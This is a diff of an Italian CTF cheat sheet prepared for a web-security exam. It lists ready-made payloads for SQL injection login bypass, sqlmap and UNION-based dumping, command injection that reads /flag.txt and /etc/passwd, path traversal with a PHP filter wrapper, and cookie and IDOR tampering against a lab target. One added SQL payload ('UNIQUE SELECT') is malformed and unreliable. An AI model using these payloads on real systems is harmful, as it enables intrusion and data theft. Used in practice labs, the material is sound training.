@@ -1,140 +1,144 @@
-Markdown
-# Supporto CTF Web Security - Esame Cybersecurity
+# Repository di Supporto - Esame Cybersecurity 2026 (Web Security)
 
 ## INDICE DEGLI ESERCIZI
+1. [Esercizio 1: Recon & Fuzzing (Identificazione Pagine Nascoste)](#1)
+2. [Esercizio 2: SQL Injection (Bypass Login Form)](#2)
+3. [Esercizio 3: SQL Injection (Estrazione Dati Automatica con SQLMap)](#3)
+4. [Esercizio 4: SQL Injection Manuale (UNION Based & File Reading)](#4)
+5. [Esercizio 5: Command Injection (Esecuzione Comandi e Reverse Shell)](#5)
+6. [Esercizio 6: Local File Inclusion & Path Traversal (Lettura File di Sistema)](#6)
+7. [Esercizio 7: Broken Authentication & IDOR (Manipolazione Cookie e ID)](#7)
 
-1. [Recon & Fuzzing (Identificazione Pagine Nascoste)](#1)
-2. [SQL Injection (Bypass Login e SQLMap)](#2)
-3. [Command Injection (Esecuzione Comandi di Sistema)](#3)
-4. [Local File Inclusion & Path Traversal (Lettura File)](#4)
-5. [Broken Authentication & IDOR (Manipolazione Privilegi)](#5)
+## Metodologia Generale CTF Web
+- Trova l'IP della VM target.
+- Identifica la vulnerabilità principale partendo dal punto 1 (Fuzzing).
+- Esegui i payload specifici per estrarre la flag nel formato `cysec{...}`.
 
 ---
-
 ## 1
+Mappatura dell'applicazione alla ricerca di file dimenticati, backup o directory nascoste (es. config.php.bak, flag.txt, admin.php).
 
-Prima di attaccare, è fondamentale mappare l'applicazione alla ricerca di file dimenticati, backup o directory nascoste (es. `config.php.bak`, `flag.txt`, `admin.php`).
-
-### Ispezione Rapida con Curl
-bash
-# Mostra la pagina inclusi gli Header HTTP (cerca cookie strani o commenti nel server)
+```bash
+# 1. Ispezione Rapida con Curl (mostra intestazioni HTTP e cookie)
 curl -i http://TARGET_IP/
 
-# Invia una richiesta POST rapida
-curl -X POST -d "username=admin&password=admin" http://TARGET_IP/login.php
-Directory Brute-Forcing con DIRB / Gobuster
-Se sulla macchina del laboratorio sono presenti questi tool, usali subito per trovare file nascosti:
-
-Bash
-# Utilizzo di DIRB (wordlist di default)
+# 2. Directory Brute-Forcing con DIRB (se disponibile)
 dirb http://TARGET_IP/ /usr/share/wordlists/dirb/common.txt
 
-# Utilizzo di Gobuster (specifico per estensioni come .php, .txt, .bak)
+# 3. Directory Brute-Forcing con Gobuster (estensioni sensibili)
 gobuster dir -u http://TARGET_IP/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,bak,html
-2
-Si verifica quando l'input dell'utente viene concatenato direttamente in una query SQL (es. form di login, barre di ricerca, parametri ?id=1).
+```
+---
 
-Bypass del Login (Authentication Bypass)
-Inserisci questi payload direttamente nei campi Username o Password del form web:
+---
+## 2
+Bypass del controllo credenziali nei form di Login (Authentication Bypass).
+
+```sql
+-- Inserire uno dei seguenti payload direttamente nei campi Username o Password della pagina web:
 
 ' OR 1=1 -- -
-
 ' OR '1'='1
-
 admin' -- -
-
 admin' #
+' UNIQUE SELECT 1 -- -
+```
+---
 
-Sfruttamento tramite SQLMAP (Automazione)
-Se il tool è installato, automatizza l'estrazione della flag senza farlo a mano:
+---
+## 3
+Automazione dell'estrazione di tabelle e flag da un parametro vulnerabile a SQL Injection (es: `?id=1`).
 
-Bash
-# 1. Trova i nomi dei Database presenti
+```bash
+# 1. Identificazione automatica ed estrazione dei Database presenti
 sqlmap -u "http://TARGET_IP/index.php?id=1" --dbs --batch
 
-# 2. Trova le tabelle del database specifico (es. se trovi un DB chiamato 'cysec_db')
+# 2. Estrazione delle tabelle dal database mirato (sostituire 'cysec_db')
 sqlmap -u "http://TARGET_IP/index.php?id=1" -D cysec_db --tables --batch
 
-# 3. Estrai il contenuto (Dump) della tabella che ispira fiducia (es. 'users' o 'flags')
+# 3. Dump del contenuto della tabella contenente i dati sensibili (es: 'flags')
 sqlmap -u "http://TARGET_IP/index.php?id=1" -D cysec_db -T flags --dump --batch
-Sfruttamento Manuale (UNION Based)
-Se devi farlo a mano in una barra di ricerca o parametro URL:
+```
+---
 
-SQL
--- 1. Trova il numero di colonne (incrementa finché non dà errore)
+---
+## 4
+Sfruttamento manuale di una vulnerabilità SQLi quando sqlmap non è utilizzabile o si richiede la lettura di un file locale.
+
+```sql
+-- 1. Determinare il numero di colonne della query originale
 ' ORDER BY 1 -- -
 ' ORDER BY 2 -- -
 
--- 2. Identifica quali colonne stampano a schermo
+-- 2. Individuare quali colonne stampano l'output a schermo
 ' UNION SELECT 1,2,3 -- -
 
--- 3. Estrai i nomi delle tabelle (es. su MySQL)
+-- 3. Enumerare i nomi delle tabelle del database corrente
 ' UNION SELECT null, table_name FROM information_schema.tables WHERE table_schema=database() -- -
 
--- 4. Leggi direttamente un file sul server (se i privilegi del DB lo consentono)
+-- 4. Leggere un file direttamente dal file system (es: flag.txt nel webroot)
 ' UNION SELECT null, LOAD_FILE('/var/www/html/flag.txt') -- -
-3
-Si verifica quando il sito prende un input e lo passa a una shell di sistema (es. form per fare il "ping" a un host, form per tracciare spedizioni).
+```
+---
 
-Operatori di Concatenazione in Bash
-Inserisci l'input richiesto (es. un IP) seguito da un operatore e dal comando per leggere la flag:
+---
+## 5
+Esecuzione di comandi di sistema sul server tramite input non sanificati (es: form di utility Ping, Tracciamenti).
 
-Punto e virgola (esegue dopo): 8.8.8.8 ; cat /flag.txt
+```bash
+# Concatenare i comandi usando i delimitatori di Bash nell'input del form:
 
-AND logico (esegue se il primo riesce): 8.8.8.8 && cat flag.txt
+# Variante A (Punto e virgola)
+8.8.8.8 ; cat /flag.txt
 
-OR logico (esegue se il primo fallisce): invalid_input || cat /var/www/html/flag.txt
+# Variante B (AND logico)
+8.8.8.8 && cat flag.txt
 
-Pipe (passa l'output): 8.8.8.8 | cat /etc/passwd
+# Variante C (Iniezione in-line)
+$(cat /flag.txt)
 
-Iniezione in linea: $(cat /flag.txt) oppure `cat /flag.txt`
+# Comandi utili post-compromissione per la ricognizione interna:
+whoami
+ls -la
+find / -name "*flag*" 2>/dev/null
+```
+---
 
-Comandi utili da lanciare se inietti con successo:
-Bash
-whoami          # Per capire che utente sei (es. www-data)
-ls -la          # Elenca i file nella cartella corrente (cerca .txt nascosti)
-find / -name "*flag*" 2>/dev/null  # Cerca ovunque nel sistema file con la parola flag
-4
-Si verifica quando l'applicazione include file locali basandosi su un parametro dell'utente (es. site.com/index.php?page=welcome.html).
+---
+## 6
+Lettura di file arbitrari al di fuori della cartella web root manipolando i parametri di inclusione file (es: `?page=`).
 
-Payload di Navigazione (Path Traversal)
-Modifica il valore del parametro nell'URL provando a risalire l'albero delle directory:
+```bash
+# 1. Path Traversal classico per verificare la vulnerabilità
+http://TARGET_IP/index.php?page=../../../../etc/passwd
 
-http://TARGET_IP/index.php?page=../../../../etc/passwd (Verifica se funziona)
-
+# 2. Lettura diretta della flag nei percorsi standard
 http://TARGET_IP/index.php?page=../../../../flag.txt
-
 http://TARGET_IP/index.php?page=../../../../var/www/html/flag.txt
-
 http://TARGET_IP/index.php?page=../../../../home/studente/flag.txt
 
-Bypass Comuni se ci sono filtri deboli:
-Filtro che elimina ../: Prova a raddoppiarlo: ....//....//....//etc/passwd
+# 3. Bypass filtri deboli (raddoppio dei caratteri di escape)
+http://TARGET_IP/index.php?page=....//....//....//flag.txt
 
-Uso dei PHP Wrappers (per leggere codice sorgente oscurato):
-?page=php://filter/convert.base64-encode/resource=config.php
+# 4. PHP Wrapper per leggere sorgenti PHP senza eseguirli (restituisce Base64)
+http://TARGET_IP/index.php?page=php://filter/convert.base64-encode/resource=config.php
+# Decodifica su terminale locale: echo "STRINGA_BASE64" | base64 -d
+```
+---
 
-(Ti restituirà una stringa in Base64 del codice sorgente di config.php; copiala e decodificala sul tuo terminale con echo "STRINGA" | base64 -d).
+---
+## 7
+Manipolazione delle sessioni e scalata dei privileges modificando parametri client-side (Cookie o ID nell'URL).
 
-5
-Si verifica quando il controllo degli accessi si basa su dati modificabili dal client o su logiche manipolabili nei Cookie/Sorgente.
+```text
+Metodo Cookie (F12 -> Application/Storage -> Cookies):
+1. Individuare cookie di stato (es: user=studente, isAdmin=false, role=user).
+2. Modificare i valori in: user=admin, isAdmin=true, role=administrator.
+3. Ricaricare la pagina (F5).
 
-Ispezione e Manipolazione dei Cookie (F12 Developer Tools)
-Apri la pagina del sito nel browser.
-
-Premi F12 (o tasto destro -> Ispeziona) e vai sulla scheda Application (Chrome) o Storage (Firefox) -> Cookies.
-
-Cerca valori sospetti e modificali facendo doppio clic:
-
-user=studente -> Cambia in user=admin o user=root
-
-isAdmin=false -> Cambia in isAdmin=true
-
-role=user -> Cambia in role=administrator
-
-Ricarica la pagina (F5).
-
-Insecure Direct Object Reference (IDOR)
-Controlla se l'URL espone degli identificativi numerici o testuali per mostrare dati privati:
-
-Se l'URL è http://TARGET_IP/profile.php?id=14, prova a modificarlo manualmente in ?id=1, ?id=0 o ?id=2 per vedere se accedi ai profili o ai file di altri utenti (tra cui l'amministratore).
+Metodo IDOR (Insecure Direct Object Reference):
+Se l'URL mostra riferimenti numerici ad oggetti privati (es: ?id=14):
+Modificare manualmente il parametro provando valori amministrativi o sequenziali:
+- ?id=1
+- ?id=0
+- ?id=2
